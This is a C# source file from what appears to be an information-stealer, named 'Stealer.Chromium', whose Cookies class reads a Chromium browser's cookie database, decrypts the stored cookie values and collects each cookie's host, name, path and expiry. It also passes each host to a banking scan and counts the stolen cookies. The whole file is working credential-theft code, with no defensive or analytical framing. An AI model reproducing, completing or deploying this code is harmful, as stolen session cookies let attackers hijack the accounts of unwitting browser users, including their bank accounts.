using System.Collections.Generic;

namespace Stealer.Chromium;

internal sealed class Cookies
{
	public static List<Cookie> Get(string sCookie)
	{
		try
		{
			List<Cookie> list = new List<Cookie>();
			SQLite sQLite = SqlReader.ReadTable(sCookie, "cookies");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Cookie item = default(Cookie);
				item.sValue = Crypto.EasyDecrypt(sCookie, sQLite.GetValue(i, 12));
				if (item.sValue == "")
				{
					item.sValue = sQLite.GetValue(i, 3);
				}
				item.sHostKey = Crypto.GetUTF8(sQLite.GetValue(i, 1));
				item.sName = Crypto.GetUTF8(sQLite.GetValue(i, 2));
				item.sPath = Crypto.GetUTF8(sQLite.GetValue(i, 4));
				item.sExpiresUtc = Crypto.GetUTF8(sQLite.GetValue(i, 5));
				item.sIsSecure = Crypto.GetUTF8(sQLite.GetValue(i, 6).ToUpper());
				Banking.ScanData(item.sHostKey);
				Counter.Cookies++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Cookie>();
		}
	}
}
